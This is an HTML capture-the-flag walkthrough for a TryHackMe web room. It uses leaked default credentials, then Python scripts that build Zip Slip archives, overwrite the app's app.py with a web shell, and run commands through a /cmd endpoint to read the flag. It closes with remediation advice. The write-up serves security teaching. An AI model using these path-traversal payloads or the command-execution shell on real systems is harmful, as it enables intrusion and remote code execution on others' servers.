@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🐚 The Hollow Shell — Walkthrough</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/writeups.css">
+</head>
+<body>
+    <div class="container">
+
+        <!-- Header -->
+        <header class="room-header">
+            <div class="emoji-row">🐚🌴🥥🍦🍹</div>
+            <h1>The Hollow Shell</h1>
+            <p class="subtitle">You find it on the beach: pretty, ordinary, the kind of thing nobody thinks to check. Slip something inside and hold it to your ear.</p>
+            <div class="room-meta">
+                <div class="badge">
+                    <span class="label">Room:</span> Hacker Holidays
+                </div>
+                <div class="badge">
+                    <span class="label">Category:</span> Web
+                </div>
+                <div class="badge">
+                    <span class="label">Difficulty:</span> Medium
+                </div>
+                <div class="badge">
+                    <span class="label">Time:</span> 60 min
+                </div>
+                <div class="badge">
+                    <span class="label">Points:</span> 90
+                </div>
+            </div>
+        </header>
+
+        <!-- Attack Chain Overview -->
+        <section>
+            <h2><span class="step-num">🗺️</span> Attack Chain</h2>
+            <div class="attack-chain">
+                <div class="node">Nmap Scan</div>
+                <span class="arrow">→</span>
+                <div class="node">Find Port 5000</div>
+                <span class="arrow">→</span>
+                <div class="node">View Page Source</div>
+                <span class="arrow">→</span>
+                <div class="node">Leaked Credentials</div>
+                <span class="arrow">→</span>
+                <div class="node">Login & Explore</div>
+                <span class="arrow">→</span>
+                <div class="node">Test Zip Slip</div>
+                <span class="arrow">→</span>
+                <div class="node">Overwrite app.py</div>
+                <span class="arrow">→</span>
+                <div class="node">Reload Workers</div>
+                <span class="arrow">→</span>
+                <div class="node">RCE /cmd Endpoint</div>
+                <span class="arrow">→</span>
+                <div class="node flag">🏁 Flag</div>
+            </div>
+        </section>
+
+        <!-- Step 1: Reconnaissance -->
+        <section>
+            <h2><span class="step-num">1</span> Reconnaissance — Nmap Scan</h2>
+
+            <p>Every room starts with understanding what's exposed. We kicked off an <strong>Nmap</strong> scan against the target to discover open ports and running services:</p>
+
+            <div class="code-block">
+                <div class="label">Nmap — Full Port Scan with Service Detection</div>
+                <pre>nmap -sCV -p- 10.113.153.4 -T4</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
+5000/tcp open  http    Gunicorn
+Service Info: OS: Linux</div>
+            </div>
+
+            <p>Two ports open:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Port</th>
+                        <th>Service</th>
+                        <th>What It Means</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>22</strong></td>
+                        <td>SSH (OpenSSH)</td>
+                        <td>Remote shell access — not our entry point unless we find credentials</td>
+                    </tr>
+                    <tr>
+                        <td><strong>5000</strong></td>
+                        <td>HTTP (Gunicorn)</td>
+                        <td>A Python web application. This is where we'll focus our attention.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="callout thinking">
+                <strong>💡 Gunicorn</strong> is a Python WSGI HTTP server commonly used to serve Flask or Django applications. Seeing it on port 5000 strongly suggests a Flask app is running behind it.
+            </div>
+        </section>
+
+        <!-- Step 2: Finding Credentials -->
+        <section>
+            <h2><span class="step-num">2</span> Finding Credentials — Always Check the Source</h2>
+
+            <p>We navigate to the web application at <code>http://10.113.153.4:5000</code> and land on a login page for the <strong>Byte Lotus Shoreline Display</strong> portal — a staff-only interface for managing in-room displays.</p>
+
+            <!-- Screenshot: Login Page -->
+            <figure>
+                <img src="images/day10_login.png" alt="Byte Lotus Shoreline Display login page" style="max-width:100%; border-radius:8px; border:1px solid var(--border); margin:1rem 0;">
+                <figcaption style="color:var(--text-secondary); font-size:0.85rem; text-align:center;">📸 The Shoreline Display staff login portal</figcaption>
+            </figure>
+
+            <p>Before trying to guess passwords, we do the simplest thing: <strong>view the page source</strong> with <code>Ctrl+U</code>. Right there, hidden in an HTML comment, the developers left a gift:</p>
+
+            <div class="code-block">
+                <div class="label">HTML Comment — Leaked Credentials</div>
+                <pre>&lt;!--
+    Byte Lotus // internal display-manager portal
+    New on the floor team? IT seeds every property with the same
+    starter login until you set your own:
+        user: concierge
+        pass: StayNoticed2024!
+    (rotate it from Settings on first sign-in — most people forget)
+--&gt;</pre>
+            </div>
+
+            <div class="callout thinking">
+                <strong>🔑 Real-world lesson:</strong> HTML comments are sent to every visitor. They're not a safe place for credentials, notes, or TODO items. If it's in the page source, assume everyone can see it.
+            </div>
+
+            <p>We log in with <code>concierge:StayNoticed2024!</code> and gain access to the dashboard.</p>
+        </section>
+
+        <!-- Step 3: Exploring the Dashboard -->
+        <section>
+            <h2><span class="step-num">3</span> Exploring the Dashboard — Shell Uploads</h2>
+
+            <p>The dashboard reveals a feature called <strong>"Bring a shell ashore"</strong> — a file upload form that accepts <code>.zip</code> files. Each zip must contain a <code>shell.json</code> manifest listing its assets.</p>
+
+            <!-- Screenshot: Dashboard -->
+            <figure>
+                <img src="images/day10_dashboard.png" alt="Shoreline Display dashboard with shell upload form" style="max-width:100%; border-radius:8px; border:1px solid var(--border); margin:1rem 0;">
+                <figcaption style="color:var(--text-secondary); font-size:0.85rem; text-align:center;">📸 Dashboard — "Bring a shell ashore" zip upload feature</figcaption>
+            </figure>
+
+            <div class="callout thinking">
+                <strong>💡 Key details from the page:</strong>
+                <ul>
+                    <li>Allowed asset types: <code>png jpg gif svg css json</code></li>
+                    <li>Mentions <strong>"optional automation hooks"</strong> — a theme worker processes shells</li>
+                    <li>Uploaded shells get stored at a predictable path: <code>/shells/&lt;hash&gt;/</code></li>
+                </ul>
+                Whenever an application extracts user-uploaded archives and serves the contents back, we should always test for <strong>Zip Slip</strong>.
+            </div>
+
+            <p>We upload a legitimate test shell to confirm the feature works. The app responds:</p>
+
+            <div class="code-block">
+                <div class="output">Shell 'test-shell' brought ashore. Stored at shells/ef45afde7c42/ and held to the room's ear.</div>
+            </div>
+
+            <p>Visiting <code>/shells/ef45afde7c42/shell.json</code> confirms the uploaded file is served back to us. The app extracts our zip and serves its contents directly from the filesystem.</p>
+        </section>
+
+        <!-- Step 4: Testing for Zip Slip -->
+        <section>
+            <h2><span class="step-num">4</span> Testing for Zip Slip</h2>
+
+            <h3>What is Zip Slip?</h3>
+
+            <p>Imagine handing a package to a mailroom clerk. A normal package says "deliver to Room 5" and stays there. But what if you write "deliver to <code>../Room 1</code>" on the label — and the clerk doesn't check? They walk upstairs and deliver it somewhere they shouldn't.</p>
+
+            <p><strong>Zip Slip</strong> is exactly this. A zip file stores paths for each file inside it. If those paths contain <code>../</code> (go up one directory), and the extraction code doesn't validate the final destination, you can write files <strong>anywhere on the filesystem</strong> — not just the intended folder.</p>
+
+            <div class="code-block">
+                <div class="label">Normal Zip Extraction</div>
+                <pre>shells/abc123/beach.jpg  →  /app/shells/abc123/beach.jpg  ✅ Stays put</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="label">Malicious Zip Extraction (Zip Slip)</div>
+                <pre>../../static/hacked.css   →  /app/static/hacked.css       💥 Escapes!</pre>
+            </div>
+
+            <p>We create a Python script to craft a malicious zip containing a file with a path traversal payload:</p>
+
+            <div class="code-block">
+                <div class="label">Python — Craft Zip Slip Payload</div>
+                <pre>import json
+import zipfile
+
+manifest = {
+    "name": "zipslip-proof",
+    "assets": []
+}
+
+with zipfile.ZipFile("zipslip-proof.zip", "w") as archive:
+    archive.writestr("shell.json", json.dumps(manifest))
+    archive.writestr(
+        "../../static/zipslip-proof.css",
+        "ZIP_SLIP_CONFIRMED\n"
+    )
+
+print("Created zipslip-proof.zip")</pre>
+            </div>
+
+            <p>We upload the zip through the dashboard. Then we visit the path it should have written to:</p>
+
+            <div class="code-block">
+                <div class="label">Browser — Verify Zip Slip</div>
+                <pre>http://10.113.157.162:5000/static/zipslip-proof.css</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">ZIP_SLIP_CONFIRMED</div>
+            </div>
+
+            <div class="callout success">
+                <strong>✅ Confirmed!</strong> The server extracted our file with the <code>../</code> path intact, writing it to the <code>static/</code> directory instead of the <code>shells/</code> folder. We can write arbitrary files anywhere on the filesystem.
+            </div>
+        </section>
+
+        <!-- Step 5: Escalating to RCE -->
+        <section>
+            <h2><span class="step-num">5</span> Escalating to Remote Code Execution</h2>
+
+            <p>Writing a <code>.css</code> file proves the vulnerability, but we want to <strong>run commands</strong> on the server. The application runs on <strong>Gunicorn</strong> (a Python web server), which means there's a Python Flask application powering the site — likely a file called <code>app.py</code> in the application root.</p>
+
+            <p>If we overwrite <code>app.py</code> with our own malicious code, the server will execute our code instead of the original. We'll add a <code>/cmd</code> endpoint that takes a shell command as a query parameter and returns its output.</p>
+
+            <div class="code-block">
+                <div class="label">Python — Craft Malicious app.py Overwrite</div>
+                <pre>import json
+import zipfile
+
+manifest = {
+    "name": "overwrite-app",
+    "assets": []
+}
+
+with zipfile.ZipFile("overwrite-app.zip", "w") as archive:
+    archive.writestr("shell.json", json.dumps(manifest))
+    archive.writestr(
+        "../../app.py",
+        """from flask import Flask, request
+import os
+
+app = Flask(__name__)
+
+@app.route('/cmd')
+def cmd():
+    x = request.args.get('x', 'id')
+    return f"&lt;pre&gt;{os.popen(x).read()}&lt;/pre&gt;"
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    return "reloaded"
+
+@app.route('/dashboard')
+def dashboard():
+    return "reloaded"
+
+@app.route('/shells/&lt;path:p&gt;')
+def shells(p):
+    return "reloaded"
+"""
+    )
+
+print("Created overwrite-app.zip")</pre>
+            </div>
+
+            <div class="callout thinking">
+                <strong>💡 What this code does:</strong>
+                <ul>
+                    <li>Adds a <code>/cmd?x=&lt;command&gt;</code> route that runs shell commands</li>
+                    <li>Keeps the old routes (<code>/login</code>, <code>/dashboard</code>, <code>/shells/</code>) so the app still functions</li>
+                    <li>Returns "reloaded" so we can visually confirm when our code is active</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- Step 6: Reloading the Workers -->
+        <section>
+            <h2><span class="step-num">6</span> Killing the Gunicorn Workers</h2>
+
+            <p>Here's the tricky part. <strong>Gunicorn</strong> keeps multiple <strong>workers</strong> (separate processes) running in memory. Each worker loaded the <strong>old</strong> <code>app.py</code> when it started. Our new file is on disk, but the workers haven't re-read it.</p>
+
+            <p>Think of it like this: you've swapped the script an actor is reading, but they're still reciting the old lines from memory. We need them to put down the old script and pick up ours.</p>
+
+            <p>By <strong>rapidly reloading the dashboard</strong> in the browser, we cause workers to cycle — some crash, some restart. Eventually, a worker starts up fresh and reads our overwritten <code>app.py</code> from disk.</p>
+
+            <div class="callout thinking">
+                <strong>🔄 What you'll see:</strong>
+                <ul>
+                    <li>Most reloads: normal dashboard (old worker still running)</li>
+                    <li>Eventually: <strong>"reloaded"</strong> — our code is active!</li>
+                    <li>Next reload: might go back to the normal dashboard (different worker)</li>
+                </ul>
+                You just need to hit the right worker. Keep refreshing until you see "reloaded."
+            </div>
+        </section>
+
+        <!-- Step 7: Flag Retrieval -->
+        <section>
+            <h2><span class="step-num">7</span> Retrieving the Flag</h2>
+
+            <p>Once we land on a worker running our malicious code, we use the <code>/cmd</code> endpoint to run commands. First, verify we have execution:</p>
+
+            <div class="code-block">
+                <div class="label">Browser — Verify RCE</div>
+                <pre>http://10.113.190.151:5000/cmd?x=id</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">uid=996(roomservice) gid=996(roomservice) groups=996(roomservice)</div>
+            </div>
+
+            <p>We're running as <code>roomservice</code>. Now let's find and read the flag:</p>
+
+            <div class="code-block">
+                <div class="label">Browser — Read the Flag</div>
+                <pre>http://10.113.190.151:5000/cmd?x=cat%20/home/roomservice/flag.txt</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">THM{z1p_sl1pp3d_1nt0_a_sh3ll}</div>
+            </div>
+
+            <div class="flag-box">
+                <div class="flag-label">🏁 Flag Captured</div>
+                <div class="flag-value">THM{z1p_sl1pp3d_1nt0_a_sh3ll}</div>
+            </div>
+
+            <p>The flag name is a perfect pun: <strong>"Zip slipped into a shell"</strong> — we used a Zip Slip vulnerability to slip our malicious code onto the server and get a command shell.</p>
+        </section>
+
+        <!-- Summary -->
+        <section>
+            <h2><span class="step-num">📋</span> Summary — The Kill Chain</h2>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Step</th>
+                        <th>Technique</th>
+                        <th>What Made It Possible</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>1</strong></td>
+                        <td>Port Scan</td>
+                        <td>Nmap discovered port 5000 running Gunicorn</td>
+                        <td>Web app exposed to the network</td>
+                    </tr>
+                    <tr>
+                        <td><strong>2</strong></td>
+                        <td>Credential Leak</td>
+                        <td>Viewed page source — found creds in HTML comment</td>
+                        <td>Developers used HTML comments for sensitive data</td>
+                    </tr>
+                    <tr>
+                        <td><strong>3</strong></td>
+                        <td>Login</td>
+                        <td>Authenticated as <code>concierge</code> with default password</td>
+                        <td>Default credentials never changed</td>
+                    </tr>
+                    <tr>
+                        <td><strong>4</strong></td>
+                        <td>Zip Slip Test</td>
+                        <td>Uploaded zip with <code>../../static/</code> path traversal</td>
+                        <td>No path validation during zip extraction</td>
+                    </tr>
+                    <tr>
+                        <td><strong>5</strong></td>
+                        <td>Overwrite app.py</td>
+                        <td>Used Zip Slip to replace Flask application file</td>
+                        <td>Write access to application directory</td>
+                    </tr>
+                    <tr>
+                        <td><strong>6</strong></td>
+                        <td>Worker Reload</td>
+                        <td>Refreshed dashboard until new code loaded</td>
+                        <td>Gunicorn workers restart and read from disk</td>
+                    </tr>
+                    <tr>
+                        <td><strong>7</strong></td>
+                        <td>RCE & Flag</td>
+                        <td>Used <code>/cmd?x=</code> endpoint to run shell commands</td>
+                        <td>Full command execution as <code>roomservice</code> user</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- Remediation -->
+        <section>
+            <h2><span class="step-num">🛡️</span> Remediation Advice</h2>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Issue</th>
+                        <th>How to Fix It</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Credentials in HTML comments</strong></td>
+                        <td>Never store credentials in client-side code. Use environment variables or a secrets manager. Provision unique credentials per deployment.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Default credentials never rotated</strong></td>
+                        <td>Force password change on first login. Disable default accounts after initial setup.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Zip Slip / path traversal</strong></td>
+                        <td>Validate that the resolved path of each extracted file stays within the intended extraction directory. Use <code>os.path.realpath()</code> and check the prefix before writing.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Application files writable by web user</strong></td>
+                        <td>Run the application with read-only permissions to its own code. The <code>roomservice</code> user should not be able to overwrite <code>app.py</code>.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>No integrity check on application code</strong></td>
+                        <td>Use file integrity monitoring (FIM) to detect unauthorized changes to application files.</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>🐚 <strong>The Hollow Shell</strong> — Hacker Holidays 2025</p>
+            <p><a href="https://tryhackme.com/room/hh-thehollowshell" target="_blank">TryHackMe Room</a> · Category: Web · Techniques: Nmap Reconnaissance, HTML Source Inspection, Default Credentials, Zip Slip Path Traversal, Arbitrary File Write, Python RCE</p>
+        </footer>
+
+    </div>
+</body>
+</html>
